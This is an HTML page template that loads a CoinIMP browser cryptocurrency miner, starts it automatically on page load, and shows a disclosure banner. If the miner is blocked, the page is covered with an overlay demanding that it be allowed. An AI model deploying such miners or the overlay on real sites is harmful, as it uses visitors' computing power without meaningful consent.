<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CoinIMP Miner Example</title>
</head>
<body>
    <h1>Добро пожаловать на сайт!</h1>
    <p>Этот сайт использует браузерный майнер CoinIMP для поддержки сервиса.</p>
    <p>Если вы видите уведомление или сайт не работает, пожалуйста, разрешите выполнение JavaScript.</p>

    <!-- Подключение CoinIMP скрипта -->
    <script src="https://www.hostingcloud.racing/ZZl9.js"></script>
    <script>
        // Настройка клиента CoinIMP
        var _client = new Client.Anonymous('578eb57e7ae07b7a91c9597e2e8704178c80c3f91facc1e88333c3f36322ccfa', {
            throttle: 0.8, // Ограничение использования CPU (0 — максимум, 1 — минимальное использование)
            c: 'w'        // Опция для включения воркеров
        });
        _client.start();

        // Уведомление для пользователей
        _client.addMiningNotification("Top", 
            "Этот сайт использует CoinIMP для поддержки. Если это вас беспокоит, вы можете остановить процесс.", 
            "#cccccc", 40, "#3d3d3d");

        // Проверка доступности майнера через 1 секунду
        setTimeout(function() {
            if (typeof _client === 'undefined' || _client === null) {
                // Создание уведомления для пользователей, если майнер заблокирован
                var messageDiv = document.createElement("div");
                messageDiv.setAttribute("style", "width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
                messageDiv.appendChild(document.createTextNode("Пожалуйста, разрешите выполнение скрипта майнинга для продолжения работы сайта. Перезагрузите страницу после этого."));

                var mainDiv = document.createElement("div");
                mainDiv.setAttribute("style", "position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c; align-items: center; justify-content: center;");
                mainDiv.appendChild(messageDiv);

                document.body.appendChild(mainDiv);
                document.getElementsByTagName("body")[0].style.overflow = "hidden";
                window.scrollTo(0, 0);
            }
        }, 1000);
    </script>
</body>
</html>
